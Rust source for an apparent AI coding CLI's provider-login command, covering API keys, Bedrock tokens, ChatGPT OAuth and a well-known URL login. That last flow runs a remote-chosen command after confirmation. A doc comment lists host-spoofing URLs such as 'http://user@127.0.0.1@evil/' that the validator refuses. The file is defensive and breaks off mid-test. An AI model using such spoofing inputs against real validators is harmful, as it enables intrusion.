use std::collections::{BTreeMap, BTreeSet};
use std::io::{IsTerminal as _, Read as _, Write as _};
use std::net::{TcpListener, TcpStream};
use std::time::{Duration, Instant};

use crossterm::event::{Event, KeyCode, KeyEventKind, KeyModifiers};
use serde::Deserialize;
use url::Url;
use zuno_auth::{
    API_KEY_METHOD, BEDROCK_BEARER_METHOD, BrowserAuthorization, Credential, LoginMethod,
    LoginMethodKind, LoginMethodRegistry, OpenAiOauthClient, Secret,
};
use zuno_config::schema::provider::ProviderTransport;
use zuno_llm::catalog::{Catalog, CatalogDocument, CatalogSource, ResolveInput, ResolvedProvider};

use super::terminal_prompt::{self, Choice};
use crate::command::{ProvidersArgs, ProvidersCommand};
use crate::environment::StartupEnvironment;

const BEDROCK_AUTH_GUIDANCE: &str = "\
Amazon Bedrock authentication priority:
  1. Bearer token (AWS_BEARER_TOKEN_BEDROCK or `zuno providers login`)
  2. AWS credential chain (profile, access keys, IAM roles, EKS IRSA)

Configure via zuno.json options (profile, region, endpoint) or
AWS environment variables (AWS_PROFILE, AWS_REGION, AWS_ACCESS_KEY_ID, AWS_WEB_IDENTITY_TOKEN_FILE).";

pub(super) fn execute(
    args: &ProvidersArgs,
    environment: &StartupEnvironment,
) -> Result<(), String> {
    let command = args
        .command
        .as_ref()
        .ok_or("providers subcommand is required")?;
    let env = environment.resolved();
    let layout = zuno_paths::Layout::resolve(env);
    let store = zuno_auth::AuthStore::resolve(&layout, env);

    match command {
        ProvidersCommand::List => list(&store, env, &layout),
        ProvidersCommand::Methods { provider } => methods(env, &layout, provider.as_str()),
        ProvidersCommand::Login {
            target,
            provider,
            method,
            trust_remote_command,
        } => login(
            &store,
            env,
            &layout,
            target.as_deref(),
            provider.as_deref(),
            method.as_deref(),
            *trust_remote_command,
        ),
        ProvidersCommand::Logout { provider } => logout(&store, env, &layout, provider.as_deref()),
    }
}

fn list(
    store: &zuno_auth::AuthStore,
    env: &zuno_paths::Env,
    layout: &zuno_paths::Layout,
) -> Result<(), String> {
    let credentials = store.all().map_err(|error| error.to_string())?;
    let document = catalog_document(env, layout)?;
    let config = discovered_config(env)?;
    let methods = login_method_registry(&document, &config);
    let providers = ProviderIndex::new(&document, &config, &credentials.entries, &methods);

    println!("Credentials {}", display_path(store.path(), env));
    for (provider_id, credential) in &credentials.entries {
        let suffix = if providers.contains(provider_id) {
            ""
        } else {
            " orphan"
        };
        println!(
            "{} {}{}",
            provider_name(&document, provider_id),
            credential.kind(),
            suffix
        );
    }
    println!(
        "{} credential{}",
        credentials.len(),
        if credentials.len() == 1 { "" } else { "s" }
    );

    let mut active = Vec::new();
    for (provider_id, provider) in &document {
        for variable in &provider.env {
            if env.truthy_value(variable).is_some() {
                active.push((provider_name(&document, provider_id), variable.as_str()));
            }
        }
    }
    if !active.is_empty() {
        println!();
        println!("Environment");
        for (provider, variable) in &active {
            println!("{provider} {variable}");
        }
        println!(
            "{} environment variable{}",
            active.len(),
            if active.len() == 1 { "" } else { "s" }
        );
    }
    Ok(())
}

fn methods(
    env: &zuno_paths::Env,
    layout: &zuno_paths::Layout,
    requested: &str,
) -> Result<(), String> {
    let document = catalog_document(env, layout)?;
    let config = discovered_config(env)?;
    let registry = login_method_registry(&document, &config);
    let providers = ProviderIndex::new(&document, &config, &BTreeMap::new(), &registry);
    let provider_id = providers
        .resolve(requested)
        .ok_or_else(|| unavailable_login_provider(requested))?;
    println!("Login methods for {provider_id}");
    for method in registry.methods_for(&provider_id) {
        println!("{} {}", method.id(), method.label());
    }
    Ok(())
}

fn login(
    store: &zuno_auth::AuthStore,
    env: &zuno_paths::Env,
    layout: &zuno_paths::Layout,
    target: Option<&str>,
    provider: Option<&str>,
    method: Option<&str>,
    trust_remote_command: bool,
) -> Result<(), String> {
    // The flag names a risk that only a URL login carries; accepting it anywhere else
    // would let the help text and the behaviour disagree.
    if trust_remote_command && !target.is_some_and(looks_like_url) {
        return Err(format!(
            "{TRUST_REMOTE_COMMAND_FLAG} applies only to a URL login; a provider login runs no remote-chosen command"
        ));
    }
    let requested = match (target, provider) {
        (Some(_), Some(_)) => {
            return Err("a positional provider cannot be combined with --provider".to_owned());
        }
        (Some(target), None) if looks_like_url(target) => {
            if method.is_some() {
                return Err("URL login cannot be combined with --method".to_owned());
            }
            return login_well_known(store, target, trust_remote_command);
        }
        (Some(target), None) => Some(target),
        (None, Some(provider)) => Some(provider),
        (None, None) if terminal_prompt::is_interactive() => None,
        (None, None) => {
            return Err(
                "provider is required; run `zuno auth login <provider>` or pass --provider"
                    .to_owned(),
            );
        }
    };
    let document = catalog_document(env, layout)?;
    let config = discovered_config(env)?;
    let credentials = store.all().map_err(|error| error.to_string())?.entries;
    let registry = login_method_registry(&document, &config);
    let providers = ProviderIndex::new(&document, &config, &credentials, &registry);
    let provider_id = match requested {
        Some(requested) => providers
            .resolve(requested)
            .ok_or_else(|| unavailable_login_provider(requested))?,
        None => select_provider(&providers)?,
    };

    let selected = select_login_method(&registry, &provider_id, method)?;
    if selected.id() == BEDROCK_BEARER_METHOD {
        return login_bedrock_bearer(store, &provider_id);
    }
    match selected.kind() {
        LoginMethodKind::ApiKey => login_api_key(store, &provider_id),
        LoginMethodKind::OAuthBrowser => login_chatgpt_browser(store, &provider_id),
        LoginMethodKind::OAuthDevice => login_chatgpt_device(store, &provider_id),
    }
}

fn select_provider(providers: &ProviderIndex) -> Result<String, String> {
    terminal_prompt::select("Select provider", providers.prompt_choices())?
        .ok_or_else(|| "provider login cancelled".to_owned())
}

fn select_login_method(
    registry: &LoginMethodRegistry,
    provider: &str,
    requested: Option<&str>,
) -> Result<LoginMethod, String> {
    if let Some(requested) = requested {
        return registry
            .resolve(provider, Some(requested))
            .map_err(|error| error.to_string());
    }
    if !std::io::stdin().is_terminal() {
        let methods = registry.methods_for(provider);
        if methods.len() == 1 && methods[0].id() == BEDROCK_BEARER_METHOD {
            return methods
                .into_iter()
                .next()
                .ok_or_else(|| format!("provider {provider:?} has no login methods"));
        }
        return registry
            .resolve(provider, Some(API_KEY_METHOD))
            .map_err(|error| error.to_string());
    }

    let methods = registry.methods_for(provider);
    if methods.len() == 1 {
        return methods
            .into_iter()
            .next()
            .ok_or_else(|| format!("provider {provider:?} has no login methods"));
    }
    if !terminal_prompt::is_interactive() {
        return registry
            .resolve(provider, None)
            .map_err(|error| error.to_string());
    }

    let choices = methods
        .iter()
        .map(|method| Choice::new(method.id(), method.label()).hinted(method.id()))
        .collect();
    let selected =
        terminal_prompt::select("Login method", choices)?.ok_or("provider login cancelled")?;
    registry
        .resolve(provider, Some(&selected))
        .map_err(|error| error.to_string())
}

fn login_api_key(store: &zuno_auth::AuthStore, provider: &str) -> Result<(), String> {
    let key = read_api_key()?;
    store
        .set(
            provider,
            Credential::Api {
                key: Secret::new(key),
                metadata: None,
            },
        )
        .map_err(|error| error.to_string())?;
    println!("Stored API key for {provider}");
    Ok(())
}

fn login_bedrock_bearer(store: &zuno_auth::AuthStore, provider: &str) -> Result<(), String> {
    println!("{BEDROCK_AUTH_GUIDANCE}");
    let key = read_secret(
        "Enter Amazon Bedrock bearer token: ",
        "Amazon Bedrock bearer token is required",
        "Amazon Bedrock bearer token entry cancelled",
    )?;
    store
        .set(
            provider,
            Credential::Api {
                key: Secret::new(key),
                metadata: None,
            },
        )
        .map_err(|error| error.to_string())?;
    println!("Stored Amazon Bedrock bearer token for {provider}");
    Ok(())
}

fn login_chatgpt_device(store: &zuno_auth::AuthStore, provider: &str) -> Result<(), String> {
    let client = OpenAiOauthClient::production();
    let runtime = oauth_runtime()?;
    let credential = runtime.block_on(async {
        let authorization = client
            .request_device_authorization()
            .await
            .map_err(|error| error.to_string())?;
        println!(
            "Open {} and enter code {}",
            authorization.verification_url(),
            authorization.user_code()
        );
        client
            .complete_device_authorization(&authorization)
            .await
            .map_err(|error| error.to_string())
    })?;
    store
        .set(provider, credential)
        .map_err(|error| error.to_string())?;
    println!("Logged into {provider} with ChatGPT");
    Ok(())
}

fn login_chatgpt_browser(store: &zuno_auth::AuthStore, provider: &str) -> Result<(), String> {
    let (listener, port) = bind_oauth_listener()?;
    let client = OpenAiOauthClient::production();
    let authorization = client
        .browser_authorization(format!("http://localhost:{port}/auth/callback"))
        .map_err(|error| error.to_string())?;
    println!("Open this URL to sign in:\n{}", authorization.url());
    try_open_browser(authorization.url().as_str());
    let code = wait_for_oauth_callback(listener, &authorization)?;
    let credential = oauth_runtime()?.block_on(async {
        client
            .complete_browser_authorization(&authorization, &code)
            .await
            .map_err(|error| error.to_string())
    })?;
    store
        .set(provider, credential)
        .map_err(|error| error.to_string())?;
    println!("Logged into {provider} with ChatGPT");
    Ok(())
}

fn logout(
    store: &zuno_auth::AuthStore,
    env: &zuno_paths::Env,
    layout: &zuno_paths::Layout,
    provider: Option<&str>,
) -> Result<(), String> {
    let credentials = store.all().map_err(|error| error.to_string())?;
    if credentials.is_empty() {
        return Err("No credentials found".to_owned());
    }
    let requested = provider.ok_or(
        "provider selection is interactive upstream; pass the provider id or name for headless logout",
    )?;
    let document = catalog_document(env, layout)?;
    let provider_id = credentials
        .entries
        .keys()
        .find(|id| {
            id.as_str() == requested || provider_name(&document, id).eq_ignore_ascii_case(requested)
        })
        .cloned()
        .ok_or_else(|| format!("Unknown configured provider {requested:?}"))?;
    store
        .remove(&provider_id)
        .map_err(|error| error.to_string())?;
    println!("Logout successful");
    Ok(())
}

fn catalog_document(
    env: &zuno_paths::Env,
    layout: &zuno_paths::Layout,
) -> Result<CatalogDocument, String> {
    CatalogSource::resolve(env, layout)
        .load_from_disk()
        .map(|document| document.unwrap_or_default())
        .map_err(|error| error.to_string())
}

fn discovered_config(env: &zuno_paths::Env) -> Result<zuno_config::Config, String> {
    let directory = std::env::current_dir().map_err(|error| error.to_string())?;
    let project = zuno_paths::project::resolve_project(&directory);
    let worktree = project.vcs.as_ref().map(|_| project.directory.as_path());
    zuno_config::discovery::discover_with(&zuno_config::discovery::DiscoveryOptions::new(
        &directory,
        worktree,
        env.clone(),
    ))
    .map_err(|error| error.report())
}

#[derive(Clone, Debug, PartialEq, Eq)]
struct ProviderChoice {
    id: String,
    name: String,
    configured: bool,
    credential: bool,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
struct ProviderIndex {
    choices: Vec<ProviderChoice>,
}

fn login_method_registry(
    document: &CatalogDocument,
    config: &zuno_config::Config,
) -> LoginMethodRegistry {
    let mut methods = LoginMethodRegistry::native();
    let resolved = Catalog::resolve(document, &ResolveInput::new().with_config(config));
    let configured = config.provider.as_ref();
    for (provider_id, provider) in resolved.providers() {
        if configured.is_none_or(|providers| !providers.contains_key(provider_id))
            || provider_id == "openai"
        {
            continue;
        }
        if uses_only_bedrock_transports(provider) {
            methods.register_bedrock_bearer(provider_id.clone());
        } else if accepts_stored_api_key(provider) {
            methods.register_api_key(provider_id.clone());
        }
    }
    methods
}

fn uses_only_bedrock_transports(provider: &ResolvedProvider) -> bool {
    !provider.models.is_empty()
        && provider.models.values().all(|model| {
            matches!(
                model.api.transport,
                Some(
                    ProviderTransport::Bedrock
                        | ProviderTransport::BedrockMantle
                        | ProviderTransport::BedrockRuntime
                )
            )
        })
}

fn accepts_stored_api_key(provider: &ResolvedProvider) -> bool {
    provider
        .models
        .values()
        .any(|model| match model.api.transport {
            Some(
                ProviderTransport::Anthropic
                | ProviderTransport::Google
                | ProviderTransport::Openai
                | ProviderTransport::Openrouter,
            ) => true,
            Some(ProviderTransport::OpenaiCompatible) => !model.api.url.is_empty(),
            Some(
                ProviderTransport::Bedrock
                | ProviderTransport::BedrockMantle
                | ProviderTransport::BedrockRuntime
                | ProviderTransport::GoogleVertex
                | ProviderTransport::GoogleVertexAnthropic,
            )
            | None => false,
        })
}

fn unavailable_login_provider(provider: &str) -> String {
    format!(
        "provider {provider:?} has no configured login capability; configure a routable provider before logging in"
    )
}

impl ProviderIndex {
    fn new(
        document: &CatalogDocument,
        config: &zuno_config::Config,
        credentials: &BTreeMap<String, Credential>,
        methods: &LoginMethodRegistry,
    ) -> Self {
        let mut choices = BTreeMap::from([(
            "openai".to_owned(),
            ProviderChoice {
                id: "openai".to_owned(),
                name: "OpenAI".to_owned(),
                configured: false,
                credential: false,
            },
        )]);

        if let Some(configured) = config.provider.as_ref() {
            for (id, provider) in configured.iter() {
                if methods.methods_for(id).is_empty() {
                    continue;
                }
                let choice = choices
                    .entry(id.to_owned())
                    .or_insert_with(|| ProviderChoice {
                        id: id.to_owned(),
                        name: document
                            .get(id)
                            .map_or_else(|| id.to_owned(), |provider| provider.name.clone()),
                        configured: false,
                        credential: false,
                    });
                if let Some(name) = provider.name.as_deref() {
                    choice.name = name.to_owned();
                }
                choice.configured = true;
            }
        }
        for id in credentials.keys() {
            if let Some(choice) = choices.get_mut(id) {
                choice.credential = true;
            }
        }

        let disabled = config
            .disabled_providers
            .as_deref()
            .unwrap_or_default()
            .iter()
            .cloned()
            .collect::<BTreeSet<_>>();
        let enabled = config
            .enabled_providers
            .as_ref()
            .map(|providers| providers.iter().cloned().collect::<BTreeSet<String>>());
        let mut choices = choices
            .into_values()
            .filter(|choice| valid_provider_id(&choice.id))
            .filter(|choice| !disabled.contains(&choice.id))
            .filter(|choice| {
                enabled
                    .as_ref()
                    .is_none_or(|enabled| enabled.contains(&choice.id))
            })
            .collect::<Vec<_>>();
        choices.sort_by(|left, right| {
            provider_priority(&left.id)
                .cmp(&provider_priority(&right.id))
                .then_with(|| left.name.to_lowercase().cmp(&right.name.to_lowercase()))
                .then_with(|| left.id.cmp(&right.id))
        });
        Self { choices }
    }

    fn resolve(&self, requested: &str) -> Option<String> {
        self.choices
            .iter()
            .find(|choice| {
                choice.id.eq_ignore_ascii_case(requested)
                    || choice.name.eq_ignore_ascii_case(requested)
            })
            .map(|choice| choice.id.clone())
    }

    fn contains(&self, provider: &str) -> bool {
        self.choices.iter().any(|choice| choice.id == provider)
    }

    fn prompt_choices(&self) -> Vec<Choice> {
        self.choices
            .iter()
            .map(|provider| {
                let mut hints = Vec::new();
                if provider.id == "openai" {
                    hints.push("ChatGPT Plus/Pro or API key");
                }
                if provider.configured {
                    hints.push("configured");
                }
                if provider.credential {
                    hints.push("credential stored");
                }
                let hint = if hints.is_empty() {
                    provider.id.clone()
                } else {
                    format!("{} · {}", provider.id, hints.join(" · "))
                };
                Choice::new(&provider.id, &provider.name).hinted(hint)
            })
            .collect()
    }
}

fn provider_priority(provider: &str) -> u8 {
    match provider {
        "openai" => 0,
        "github-copilot" => 1,
        "google" => 2,
        "anthropic" => 3,
        "openrouter" => 4,
        "vercel" => 5,
        _ => 99,
    }
}

fn provider_name(document: &CatalogDocument, provider_id: &str) -> String {
    document
        .get(provider_id)
        .map_or_else(|| provider_id.to_owned(), |provider| provider.name.clone())
}

#[cfg(test)]
fn resolve_provider(document: &CatalogDocument, requested: &str) -> Option<String> {
    document
        .iter()
        .find(|(id, provider)| {
            id.as_str() == requested || provider.name.eq_ignore_ascii_case(requested)
        })
        .map(|(id, _)| id.clone())
}

fn valid_provider_id(provider: &str) -> bool {
    !provider.is_empty()
        && provider
            .bytes()
            .all(|byte| byte.is_ascii_lowercase() || byte.is_ascii_digit() || byte == b'-')
}

fn looks_like_url(value: &str) -> bool {
    value.starts_with("https://") || value.starts_with("http://")
}

fn read_api_key() -> Result<String, String> {
    read_secret(
        "Enter API key: ",
        "API key is required",
        "API key entry cancelled",
    )
}

fn read_secret(prompt: &str, required: &str, cancelled: &str) -> Result<String, String> {
    if std::io::stdin().is_terminal() {
        return read_terminal_secret(prompt, required, cancelled);
    }
    let mut input = String::new();
    std::io::stdin()
        .read_to_string(&mut input)
        .map_err(|error| error.to_string())?;
    let value = input.trim().to_owned();
    if value.is_empty() {
        return Err(required.to_owned());
    }
    Ok(value)
}

fn read_terminal_secret(prompt: &str, required: &str, cancelled: &str) -> Result<String, String> {
    struct RawModeGuard;

    impl Drop for RawModeGuard {
        fn drop(&mut self) {
            let _ = crossterm::terminal::disable_raw_mode();
        }
    }

    eprint!("{prompt}");
    std::io::stderr()
        .flush()
        .map_err(|error| error.to_string())?;
    crossterm::terminal::enable_raw_mode().map_err(|error| error.to_string())?;
    let guard = RawModeGuard;
    let mut value = String::new();
    loop {
        match crossterm::event::read().map_err(|error| error.to_string())? {
            Event::Key(key) if matches!(key.kind, KeyEventKind::Press | KeyEventKind::Repeat) => {
                match key.code {
                    KeyCode::Enter => break,
                    KeyCode::Backspace => {
                        value.pop();
                    }
                    KeyCode::Char('c') if key.modifiers.contains(KeyModifiers::CONTROL) => {
                        drop(guard);
                        eprintln!();
                        return Err(cancelled.to_owned());
                    }
                    KeyCode::Char(character)
                        if !key.modifiers.intersects(
                            KeyModifiers::CONTROL
                                | KeyModifiers::ALT
                                | KeyModifiers::SUPER
                                | KeyModifiers::HYPER
                                | KeyModifiers::META,
                        ) =>
                    {
                        value.push(character);
                    }
                    _ => {}
                }
            }
            Event::Paste(text) => value.push_str(&text),
            _ => {}
        }
    }
    drop(guard);
    eprintln!();
    if value.trim().is_empty() {
        return Err(required.to_owned());
    }
    Ok(value.trim().to_owned())
}

fn oauth_runtime() -> Result<tokio::runtime::Runtime, String> {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .map_err(|error| error.to_string())
}

const OAUTH_PORTS: [u16; 2] = [1455, 1457];
const OAUTH_CALLBACK_TIMEOUT: Duration = Duration::from_secs(10 * 60);

fn bind_oauth_listener() -> Result<(TcpListener, u16), String> {
    for port in OAUTH_PORTS {
        match TcpListener::bind(("127.0.0.1", port)) {
            Ok(listener) => {
                listener
                    .set_nonblocking(true)
                    .map_err(|error| error.to_string())?;
                return Ok((listener, port));
            }
            Err(error) if error.kind() == std::io::ErrorKind::AddrInUse => {}
            Err(error) => {
                return Err(format!(
                    "failed to bind OpenAI OAuth callback port {port}: {error}"
                ));
            }
        }
    }
    Err("OpenAI OAuth callback ports 1455 and 1457 are both in use".to_owned())
}

fn wait_for_oauth_callback(
    listener: TcpListener,
    authorization: &BrowserAuthorization,
) -> Result<String, String> {
    let deadline = Instant::now() + OAUTH_CALLBACK_TIMEOUT;
    loop {
        match listener.accept() {
            Ok((mut stream, _)) => {
                if let Some(code) = read_oauth_callback(&mut stream, authorization)? {
                    return Ok(code);
                }
            }
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                if Instant::now() >= deadline {
                    return Err("OpenAI browser authorization timed out".to_owned());
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(error) => return Err(format!("OpenAI OAuth callback failed: {error}")),
        }
    }
}

fn read_oauth_callback(
    stream: &mut TcpStream,
    authorization: &BrowserAuthorization,
) -> Result<Option<String>, String> {
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .map_err(|error| error.to_string())?;
    let mut buffer = [0_u8; 16 * 1024];
    let size = stream
        .read(&mut buffer)
        .map_err(|error| format!("failed to read OpenAI OAuth callback: {error}"))?;
    let request = std::str::from_utf8(&buffer[..size])
        .map_err(|_| "OpenAI OAuth callback was not UTF-8".to_owned())?;
    let Some(target) = request
        .lines()
        .next()
        .and_then(|line| line.split_whitespace().nth(1))
    else {
        write_oauth_response(stream, "400 Bad Request", "Invalid callback request");
        return Ok(None);
    };
    let url = Url::parse(&format!("http://localhost{target}"))
        .map_err(|error| format!("invalid OpenAI OAuth callback URL: {error}"))?;
    if url.path() != "/auth/callback" {
        write_oauth_response(stream, "404 Not Found", "Not found");
        return Ok(None);
    }
    let parameters = url
        .query_pairs()
        .map(|(key, value)| (key.into_owned(), value.into_owned()))
        .collect::<std::collections::BTreeMap<_, _>>();
    if parameters.contains_key("error") {
        write_oauth_response(stream, "400 Bad Request", "Authorization was not completed");
        return Err("OpenAI rejected browser authorization".to_owned());
    }
    let state = parameters
        .get("state")
        .ok_or_else(|| "OpenAI OAuth callback omitted state".to_owned())?;
    if !authorization.state_matches(state) {
        write_oauth_response(
            stream,
            "400 Bad Request",
            "Authorization state did not match",
        );
        return Err("OpenAI OAuth callback state did not match".to_owned());
    }
    let code = parameters
        .get("code")
        .filter(|code| !code.is_empty())
        .cloned()
        .ok_or_else(|| "OpenAI OAuth callback omitted authorization code".to_owned())?;
    write_oauth_response(
        stream,
        "200 OK",
        "Authorization received. You can close this window.",
    );
    Ok(Some(code))
}

fn write_oauth_response(stream: &mut TcpStream, status: &str, message: &str) {
    let body = format!(
        "<!doctype html><meta charset=\"utf-8\"><title>Zuno login</title>\
         <body><h1>Zuno</h1><p>{message}</p></body>"
    );
    let response = format!(
        "HTTP/1.1 {status}\r\nContent-Type: text/html; charset=utf-8\r\n\
         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    let _ = stream.write_all(response.as_bytes());
    let _ = stream.flush();
}

fn try_open_browser(url: &str) {
    #[cfg(target_os = "macos")]
    let mut command = std::process::Command::new("open");
    #[cfg(target_os = "linux")]
    let mut command = std::process::Command::new("xdg-open");
    #[cfg(target_os = "windows")]
    let mut command = {
        let mut command = std::process::Command::new("cmd");
        command.args(["/C", "start", ""]);
        command
    };
    #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
    return;

    command
        .arg(url)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null());
    let _ = command.spawn();
}

fn display_path(path: &std::path::Path, env: &zuno_paths::Env) -> String {
    if let Some(home) = env.truthy_value(zuno_paths::env::HOME)
        && let Ok(relative) = path.strip_prefix(home)
    {
        return format!("~/{}", relative.display());
    }
    path.display().to_string()
}

#[derive(Debug, Deserialize)]
struct WellKnown {
    auth: WellKnownAuth,
}

#[derive(Debug, Deserialize)]
struct WellKnownAuth {
    command: Vec<String>,
    env: String,
}

const WELL_KNOWN_PATH: &str = "/.well-known/zuno";

/// The flag that lets a URL login run the remote-chosen program unconfirmed.
const TRUST_REMOTE_COMMAND_FLAG: &str = "--trust-remote-command";

/// A well-known login destination after the URL has been parsed once.
///
/// Both the transport guard and the fetch read this value, never the raw argument,
/// so the host that was checked is the host that is contacted.
#[derive(Debug, Clone, PartialEq, Eq)]
struct WellKnownTarget {
    /// The credential key: the parsed origin plus path, without a trailing slash,
    /// query, or fragment.
    provider: String,
    /// The metadata document to fetch.
    metadata_url: Url,
}

/// Parse and admit a well-known login URL.
///
/// Admitted: scheme `https`, or scheme `http` whose host is an IP address that is
/// loopback (`127.0.0.1`, `[::1]`, any `127.0.0.0/8` address). Both require empty
/// userinfo. Everything else is refused, including `http://localhost` (a name, not
/// an address, so it resolves wherever the resolver says), `http://127.0.0.1.attacker.example`
/// (a domain that merely starts with the loopback spelling), and
/// `http://user@127.0.0.1@evil/` (userinfo that ends with the loopback spelling while
/// the host is `evil`). The earlier string-prefix guard admitted the last two.
fn well_known_target(raw_url: &str) -> Result<WellKnownTarget, String> {
    let refused = |reason: &str| {
        format!(
            "well-known provider login requires an HTTPS URL, or plain HTTP to a loopback IP address such as http://127.0.0.1:8080; {raw_url:?} was refused because {reason}"
        )
    };
    let mut url =
        Url::parse(raw_url).map_err(|error| refused(&format!("it does not parse: {error}")))?;
    if url.cannot_be_a_base() {
        return Err(refused("it has no authority"));
    }
    if !url.username().is_empty() || url.password().is_some() {
        return Err(refused("it carries userinfo, which can hide the real host"));
    }
    match url.scheme() {
        "https" => {}
        "http" => {
            let loopback = match url.host() {
                Some(url::Host::Ipv4(address)) => address.is_loopback(),
                Some(url::Host::Ipv6(address)) => address.is_loopback(),
                Some(url::Host::Domain(_)) | None => false,
            };
            if !loopback {
                return Err(refused(
                    "plain HTTP is allowed only when the host is a loopback IP address, not a name",
                ));
            }
        }
        other => return Err(refused(&format!("the scheme is {other:?}"))),
    }
    if url.host_str().is_none_or(str::is_empty) {
        return Err(refused("it names no host"));
    }
    url.set_query(None);
    url.set_fragment(None);
    let base_path = url.path().trim_end_matches('/').to_owned();
    let provider = url.as_str().trim_end_matches('/').to_owned();
    let mut metadata_url = url;
    metadata_url.set_path(&format!("{base_path}{WELL_KNOWN_PATH}"));
    Ok(WellKnownTarget {
        provider,
        metadata_url,
    })
}

/// Render the remote-chosen command so a person can judge it before it runs.
///
/// Every element is shown with `Debug` quoting, so an argument containing spaces,
/// quotes, newlines, or control characters is visible as one argument rather than
/// reading as several, and an empty argument is visible at all.
fn describe_remote_command(provider: &str, program: &str, arguments: &[String]) -> String {
    let mut text = format!(
        "{provider} asks Zuno to run this program with your privileges to obtain a credential.\n  program: {program:?}\n  arguments ({}):",
        arguments.len()
    );
    if arguments.is_empty() {
        text.push_str(" none");
    }
    for argument in arguments {
        text.push_str("\n    ");
        text.push_str(&format!("{argument:?}"));
    }
    text.push_str("\nZuno did not choose this command; the remote host did.");
    text
}

fn login_well_known(
    store: &zuno_auth::AuthStore,
    raw_url: &str,
    trust_remote_command: bool,
) -> Result<(), String> {
    let target = well_known_target(raw_url)?;
    let url = target.provider.as_str();
    // Decide before the fetch whether a confirmation can happen at all. A pipe has
    // nobody to answer the prompt, so without the explicit flag the login stops here:
    // nothing is fetched, nothing is spawned, nothing is stored.
    if !trust_remote_command && !terminal_prompt::is_interactive() {
        return Err(format!(
            "well-known provider login runs a program chosen by {url}, which requires an interactive terminal to confirm; rerun in a terminal, or pass {TRUST_REMOTE_COMMAND_FLAG} to run the remote-chosen command without confirmation on a host you already trust"
        ));
    }
    let runtime = oauth_runtime()?;
    let metadata: WellKnown = runtime.block_on(async {
        zuno_network::client()
            .get(target.metadata_url.as_str())
            .send()
            .await
            .map_err(|error| format!("Failed to load auth provider metadata from {url}: {error}"))?
            .error_for_status()
            .map_err(|error| format!("Failed to load auth provider metadata from {url}: {error}"))?
            .json()
            .await
            .map_err(|error| format!("Failed to load auth provider metadata from {url}: {error}"))
    })?;
    let (program, arguments) = metadata
        .auth
        .command
        .split_first()
        .ok_or("auth provider metadata returned an empty command")?;
    eprintln!("{}", describe_remote_command(url, program, arguments));
    if trust_remote_command {
        eprintln!(
            "Running it without confirmation because {TRUST_REMOTE_COMMAND_FLAG} was passed."
        );
    } else if !terminal_prompt::confirm_choice("Run this command")? {
        return Err(
            "well-known provider login cancelled; nothing was run and nothing was stored"
                .to_owned(),
        );
    }
    let output = std::process::Command::new(program)
        .args(arguments)
        .output()
        .map_err(|error| format!("Failed to run auth provider command: {error}"))?;
    if !output.status.success() {
        return Err(format!(
            "auth provider command exited with {}; no credential was stored",
            output.status
        ));
    }
    let token = String::from_utf8(output.stdout)
        .map_err(|error| format!("auth provider command returned non-UTF-8 output: {error}"))?
        .trim()
        .to_owned();
    if token.is_empty() {
        return Err("auth provider command returned an empty token".to_owned());
    }
    store
        .set(
            url,
            Credential::WellKnown {
                key: Secret::new(metadata.auth.env),
                token: Secret::new(token),
            },
        )
        .map_err(|error| error.to_string())?;
    println!("Logged into {url}");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn api_credential() -> Credential {
        Credential::Api {
            key: Secret::new("test-key"),
            metadata: None,
        }
    }

    #[test]
    fn well_known_login_uses_the_zuno_protocol_path() {
        assert_eq!(WELL_KNOWN_PATH, "/.well-known/zuno");
    }

    #[test]
    fn provider_ids_are_deliberately_narrow() {
        assert!(valid_provider_id("openai"));
        assert!(valid_provider_id("amazon-bedrock"));
        assert!(!valid_provider_id("OpenAI"));
        assert!(!valid_provider_id("../openai"));
        assert!(!valid_provider_id(""));
    }

    #[test]
    fn provider_name_matches_case_insensitively() {
        let document: CatalogDocument = serde_json::from_str(
            r#"{"openai":{"id":"openai","name":"OpenAI","env":[],"models":{}}}"#,
        )
        .expect("catalog");
        assert_eq!(
            resolve_provider(&document, "openai").as_deref(),
            Some("openai")
        );
        assert_eq!(
            resolve_provider(&document, "OPENAI").as_deref(),
            Some("openai")
        );
    }

    #[test]
    fn interactive_provider_index_includes_only_native_and_routable_configured_providers() {
        let document: CatalogDocument = serde_json::from_str(
            r#"{
              "anthropic":{"id":"anthropic","name":"Anthropic","env":[],"models":{}},
              "zeta":{"id":"zeta","name":"Zeta","env":[],"models":{}}
            }"#,
        )
        .expect("catalog");
        let config: zuno_config::Config = serde_json::from_str(
            r#"{
              "provider": {
                "myopenai": {
                  "name": "My OpenAI",
                  "transport": "openai",
                  "models": {"gpt-test": {"name": "GPT Test"}}
                }
              }
            }"#,
        )
        .expect("config");
        let credentials = BTreeMap::from([
            ("legacy".to_owned(), api_credential()),
            ("myopenai".to_owned(), api_credential()),
        ]);
        let methods = login_method_registry(&document, &config);

        let providers = ProviderIndex::new(&document, &config, &credentials, &methods);
        let ids = providers
            .choices
            .iter()
            .map(|provider| provider.id.as_str())
            .collect::<Vec<_>>();
        assert_eq!(ids, vec!["openai", "myopenai"]);
        assert_eq!(providers.resolve("My OpenAI").as_deref(), Some("myopenai"));
        assert!(
            providers
                .choices
                .iter()
                .find(|provider| provider.id == "myopenai")
                .is_some_and(|provider| provider.credential)
        );
        assert!(!providers.contains("legacy"));
        assert_eq!(
            methods
                .methods_for("myopenai")
                .iter()
                .map(LoginMethod::id)
                .collect::<Vec<_>>(),
            vec![API_KEY_METHOD]
        );
    }

    #[test]
    fn interactive_provider_index_honors_enabled_and_disabled_filters() {
        let document: CatalogDocument = serde_json::from_str(
            r#"{
              "anthropic":{"id":"anthropic","name":"Anthropic","env":[],"models":{}},
              "openai":{"id":"openai","name":"OpenAI","env":[],"models":{}},
              "zeta":{"id":"zeta","name":"Zeta","env":[],"models":{}}
            }"#,
        )
        .expect("catalog");
        let config: zuno_config::Config = serde_json::from_str(
            r#"{
              "enabled_providers": ["openai", "zeta"],
              "disabled_providers": ["zeta"]
            }"#,
        )
        .expect("config");
        let methods = login_method_registry(&document, &config);

        let providers = ProviderIndex::new(&document, &config, &BTreeMap::new(), &methods);
        assert_eq!(
            providers
